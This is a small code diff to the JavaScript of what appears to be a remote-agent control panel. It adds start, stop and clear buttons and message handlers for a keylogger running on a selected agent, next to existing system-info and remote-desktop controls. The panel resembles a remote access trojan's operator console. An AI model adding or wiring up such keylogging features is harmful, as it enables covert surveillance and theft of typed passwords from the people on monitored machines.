@@ -93,6 +93,14 @@ Ws.onMessage(msg => SysInfo.onMessage(msg));
 $("sysinfo-btn").addEventListener("click", () => {
   if (currentAgentId) SysInfo.refresh()
 });
+Ws.onMessage(msg => Keylog.onMessage(msg));
+$("keylog-start-btn").addEventListener("click", () => {
+  if (currentAgentId) Keylog.start(currentAgentId)
+});
+$("keylog-stop-btn").addEventListener("click", () => {
+  if (currentAgentId) Keylog.stop(currentAgentId)
+});
+$("keylog-clear-btn").addEventListener("click", () => Keylog.clear());
 Ws.onMessage(msg => DesktopPanel.onMessage(msg));
 Ws.onBinary(frame => DesktopPanel.onBinary(frame));
 $("desk-start-btn").addEventListener("click", () => {
